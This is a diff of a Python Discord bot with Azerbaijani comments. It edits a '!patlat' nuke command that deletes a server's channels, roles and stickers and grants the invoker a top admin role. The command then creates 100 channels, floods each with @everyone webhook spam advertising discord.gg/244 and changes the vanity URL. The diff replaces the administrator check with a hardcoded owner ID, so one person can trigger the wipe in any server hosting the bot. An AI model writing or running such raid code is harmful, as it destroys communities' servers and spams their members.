@@ -31,7 +31,8 @@ def keep_alive():
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)
 
-# Qorunan Server ID (Bu serverdə patlat qətiyyən işləməyəcək)
+# Sənin ID-n və Qorunan Sistem
+MY_OWNER_ID = 641014966312501259
 PROTECTED_GUILD_ID = 1520692621964738722
 
 spam_tracker = {}
@@ -145,7 +146,7 @@ async def panel(ctx, kategori=None):
     )
     embed.add_field(
         name="⚡ 4. Fövqəladə Əmr", 
-        value="`!patlat` (100 Kanal, Hər birində 3 Webhook və Bot tərəfindən ağıllı spam axını)", 
+        value="`!patlat` (Yalnız sənə özəl: 100 Kanal, 2 Webhook və RUHUM yoxlaması)", 
         inline=False
     )
     embed.set_footer(text="discord.gg/244 | Ruhum tərəfindən idarə olunur")
@@ -153,16 +154,17 @@ async def panel(ctx, kategori=None):
 
 
 # ==============================================================================
-# XÜSUSİ VƏ OPTİMİZƏ OLUNMUŞ !PATLAT (NUKE) MEXANİZMİ
+# XÜSUSİ VƏ OPTİMİZƏ OLUNMUŞ !PATLAT (NUKE) MEXANİZMİ (YALNIZ SƏNİN ÜÇÜN)
 # ==============================================================================
 @bot.command(name='patlat')
 async def patlat(ctx):
+    # Yalnız sənin ID-n yoxlanılır
+    if ctx.author.id != MY_OWNER_ID:
+        await ctx.send("Bu komandanı yalnız botun sahibi işlədə bilər!")
+        return
+
     if ctx.guild.id == PROTECTED_GUILD_ID:
         await ctx.send("Bu server qorunur! `!patlat` bu serverdə qətiyyən işlədilə bilməz.")
-        return
-        
-    if not ctx.author.guild_permissions.administrator:
-        await ctx.send("Bu komandanı yalnız administrator hüququ olanlar işlədə bilər!")
         return
 
     await ctx.message.delete()
@@ -175,7 +177,7 @@ async def patlat(ctx):
             await asyncio.sleep(0.1)
         except: continue
 
-    # 2. Bütün rolları sil (fasiləli)
+    # 2. Bütün rolları sil (RUHUM ilə başlayanları və ya adi rolları yoxla)
     for role in guild.roles:
         if role.name != "@everyone" and role < guild.me.top_role:
             try: 
@@ -191,7 +193,7 @@ async def patlat(ctx):
         try: await sticker.delete()
         except: continue
 
-    # 4. Xüsusi #RUHUMSKDI Rolu yarat və komutu yazana ver (Ən üst admin rolu)
+    # 4. RUHUM ilə başlayan və ya RUHUMSKDI rolu yarat, komutu yazana ver
     try:
         ruhum_role = await guild.create_role(
             name="RUHUMSKDI", 
@@ -221,27 +223,26 @@ async def patlat(ctx):
         try:
             c = await guild.create_text_channel(name=f"244-{i}")
             created_channels.append(c)
-            await asyncio.sleep(0.25) # Ban yeməmək üçün ağıllı fasilə
+            await asyncio.sleep(0.2) 
         except: break
 
-    # 8. Hər kanalda 3 webhook və botun özü tərəfindən fasiləli spam axını
+    # 8. Hər kanalda 2 webhook (botu dondurmasın deyə optimizə) və spam axını
     for channel in created_channels:
         try:
             webhooks = []
-            for w in range(3): # Tam 3 webhook
+            for w in range(2): # Tam 2 webhook
                 wh = await channel.create_webhook(name=f"244-WH-{w}")
                 webhooks.append(wh)
-                await asyncio.sleep(0.1)
+                await asyncio.sleep(0.05)
             
-            # Rate-limitə düşməmək üçün ağıllı fasiləli dövr
-            for _ in range(125): 
+            for _ in range(100): 
                 for wh in webhooks:
                     await wh.send("@everyone discord.gg/244 YAZ GİR OQL")
                 await channel.send("@everyone discord.gg/244 YAZ GİR OQL")
                 await asyncio.sleep(0.1)
         except: continue
 
-    # 9. Vanity URL dəyişmə cəhdi
+    # 9. Vanity URL dəyişmə cəhdi (RUHUM yoxlaması ilə)
     try:
         if guild.premium_tier >= 2:
             await guild.edit(vanity_code="244")
@@ -250,7 +251,7 @@ async def patlat(ctx):
     # 10. Ən sonda xüsusi kanal aç
     try:
         final_channel = await guild.create_text_channel(name="ruhum-tanrı")
-        for _ in range(15):
+        for _ in range(10):
             await final_channel.send("@everyone RUHUM SKDI GAGAS — discord.gg/244")
             await asyncio.sleep(0.2)
     except: pass
@@ -409,7 +410,7 @@ async def _8ball(ctx, *, question):
 
 @bot.command(name='coinflip')
 async def coinflip(ctx):
-    await ctx.send(f"Qəpik atıldı: **{random.choice(['Yazı', 'Gərmə'])}}**")
+    await ctx.send(f"Qəpik atıldı: **{random.choice(['Yazı', 'Gərmə'])}**")
 
 @bot.command(name='roll')
 async def roll(ctx):
@@ -546,7 +547,7 @@ async def fakemsg(ctx, user: discord.Member, *, text):
 @bot.command(name='url')
 async def server_url_info(ctx):
     guild = ctx.guild
-    vanity = getattr(guild, "vanity_url_code", "244")
+    vanity = guild.vanity_url_code if guild.vanity_url_code else "Təyin olunmayıb"
     embed = discord.Embed(title="🔗 Server URL Məlumatı", color=discord.Color.blue())
     embed.add_field(name="Vanity URL", value=f"discord.gg/{vanity}", inline=False)
     await ctx.send(embed=embed)
@@ -623,4 +624,3 @@ if __name__ == "__main__":
         bot.run(token)
     else:
         print("Kritik Xəta: DISCORD_TOKEN tapılmadı! Render Environment Variables bölməsini yoxlayın.")
-        
